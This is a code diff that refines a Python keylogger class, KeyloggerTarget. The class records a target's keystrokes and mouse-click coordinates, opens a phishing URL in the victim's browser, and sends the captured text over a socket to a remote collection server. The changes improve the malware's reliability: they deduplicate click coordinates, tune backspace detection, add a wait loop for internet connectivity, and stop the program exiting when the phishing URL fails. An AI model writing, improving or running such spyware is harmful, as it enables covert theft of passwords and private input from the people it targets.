@@ -142,15 +142,12 @@ class KeyloggerTarget:
             key_data.connect((ip_keylogger, port_keylogger))
             # This is the ip and the port of the server the port shouldn't be the same the server_photos and the server_keylogger shouldn't be
             # in the same folder
-            self.coordinates = list(set(self.coordinates))
-            # This checks if the coordinates occur 2 times
             print(self.coordinates)
             wort = ""
             for zeichen in self.richtige_liste:
                 wort += zeichen
 
             # Gets the coordinates where the target was writing something from the beginning
-            self.coordinates = self.coordinates[::-1]
             # Sends the data to server_keylogger
             all_data = str(self.coordinates) + wort
             # Coordinates and keydata are being concatenated
@@ -175,8 +172,6 @@ class KeyloggerTarget:
             for zeichen in self.richtige_liste:
                 wort += zeichen
             if self.coordinates:
-                self.coordinates = self.coordinates[::-1]
-                # This is the same as above
                 wort += str(self.coordinates)
             data = f"THE CONNECTION HAS BEEN INTERRUPTED{wort}"
             # This let's the server know that the server should shut down
@@ -193,8 +188,6 @@ class KeyloggerTarget:
             new_server.send("done".encode())
             new_server.close()
 
-
-
     def kill_switch(self):
         # This function destroys the mouse info
         new_seconds = self.duration + 5
@@ -208,7 +201,8 @@ class KeyloggerTarget:
         # This is the click function
         print(f"Target has pressed {x} and {y}")
         # All the coordinates will be stored in "self.coordinates"
-        self.coordinates.append((x, y))
+        if (x,y) not in self.coordinates:
+            self.coordinates.append((x, y))
 
     def all_clicks(self):
         # This is just a function so it can be ran with threading
@@ -298,7 +292,7 @@ class KeyloggerTarget:
                     self.seconds.append(all)
                 minus = all - self.seconds[0]
                 # This checks if the target is holding the backspace key
-                if minus > 0.15 or minus == 0.0:
+                if minus > 0.05 or minus == 0.0:
                     if self.richtige_liste:
                         self.richtige_liste.pop(-1)
                         # Removes the last item of the list
@@ -309,25 +303,41 @@ class KeyloggerTarget:
     def on_release(self, key):
         print(f'Key released: {key}')
 
-    def start(self):
-        if self.phishing is not None:
-            while True:
-                try:
-                    response = requests.get(self.phishing)
-                    # Respone is here to see if the website is online or not
-                    webbrowser.open(self.phishing)
-                    break
+    @staticmethod
+    def internet_connection():
+        # This function checks if a connection is stable
+        while True:
+            try:
+                requests.get("https://www.google.com/")
+                # Google is always online so I chose google
+                break
+                # If there is an internet connection it will run as normal
+            except requests.exceptions.ConnectionError:
+                print("No Connection")
 
-                except requests.exceptions.ConnectionError:
-                    print("No connection")
-                    sys.exit()
+    def start(self):
+        self.internet_connection()
+        time.sleep(1)
+        # Just to cool down
+
+        if self.phishing is not None:
+            try:
+                requests.get(self.phishing)
+                # Respone is here to see if the website is online or not
+                webbrowser.open(self.phishing)
+
+            except requests.exceptions.ConnectionError:
+                print("No connection")
+
+            except requests.exceptions.InvalidURL:
+                print("Invalid Url")
 
         listening_thread = threading.Thread(target=self.daten_aufnehemen)
-        # This runs the programm behind the actual programming
+        # This runs the program behind the actual programming
         listening_thread.start()
 
         threading_mouse = threading.Thread(target=self.all_clicks)
-        # This runs the programm behind the actual programming
+        # This runs the progrmm behind the actual programming
         threading_mouse.start()
 
         send_timer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
